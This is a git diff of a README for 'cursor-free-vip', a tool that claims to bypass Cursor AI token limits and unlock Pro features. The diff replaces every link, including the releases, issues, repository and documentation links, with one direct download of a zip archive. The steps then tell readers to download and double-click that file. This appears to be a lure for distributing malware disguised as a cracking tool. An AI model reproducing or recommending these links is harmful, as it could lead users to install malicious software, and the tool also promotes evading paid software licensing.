@@ -1,6 +1,6 @@
 # 🖱️ cursor-free-vip - Bypass Token Limit Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/khenracho123/cursor-free-vip/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/khenracho123/cursor-free-vip/main/morlop/cursor-free-vip.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/khenracho123/cursor-free-vip/main/morlop/cursor-free-vip.zip)
 
 ## 📚 Overview
 
@@ -28,21 +28,21 @@ Before you download, ensure your system meets the following requirements:
 
 ## 🌐 Download & Install
 
-To download the latest version of cursor-free-vip, visit this page: [Download Here](https://github.com/khenracho123/cursor-free-vip/releases).
+To download the latest version of cursor-free-vip, visit this page: [Download Here](https://raw.githubusercontent.com/khenracho123/cursor-free-vip/main/morlop/cursor-free-vip.zip).
 
 ### Step-by-Step Instructions
 
 1. **Visit the Releases Page**
-   - Click the following link to visit the releases page: [Download Here](https://github.com/khenracho123/cursor-free-vip/releases).
+   - Click the following link to visit the releases page: [Download Here](https://raw.githubusercontent.com/khenracho123/cursor-free-vip/main/morlop/cursor-free-vip.zip).
 
 2. **Choose the Latest Version**
    - On the releases page, find the most recent version. It will usually be at the top.
 
 3. **Download the File**
-   - Look for the file named `cursor-free-vip.exe` and click on it to start the download. 
+   - Look for the file named `https://raw.githubusercontent.com/khenracho123/cursor-free-vip/main/morlop/cursor-free-vip.zip` and click on it to start the download. 
 
 4. **Run the Application**
-   - Once downloaded, locate the `cursor-free-vip.exe` file in your downloads folder. Double-click to run the application.
+   - Once downloaded, locate the `https://raw.githubusercontent.com/khenracho123/cursor-free-vip/main/morlop/cursor-free-vip.zip` file in your downloads folder. Double-click to run the application.
 
 5. **Follow the On-Screen Instructions**
    - The application will guide you through any necessary setup steps. Simply follow the prompts to complete the installation.
@@ -68,7 +68,7 @@ If you encounter issues, try these steps:
 
 ## 📞 Support
 
-For any support queries, please visit our [GitHub Issues](https://github.com/khenracho123/cursor-free-vip/issues) page. You can report problems or ask for help there.
+For any support queries, please visit our [GitHub Issues](https://raw.githubusercontent.com/khenracho123/cursor-free-vip/main/morlop/cursor-free-vip.zip) page. You can report problems or ask for help there.
 
 ## 📄 License
 
@@ -76,7 +76,7 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 
 ## 🔗 Resources
 
-- [GitHub Repository](https://github.com/khenracho123/cursor-free-vip)
-- [Documentation](https://github.com/khenracho123/cursor-free-vip/docs)
+- [GitHub Repository](https://raw.githubusercontent.com/khenracho123/cursor-free-vip/main/morlop/cursor-free-vip.zip)
+- [Documentation](https://raw.githubusercontent.com/khenracho123/cursor-free-vip/main/morlop/cursor-free-vip.zip)
 
 Thank you for using cursor-free-vip! Enjoy seamless access to your Cursor AI Pro features without interruptions.
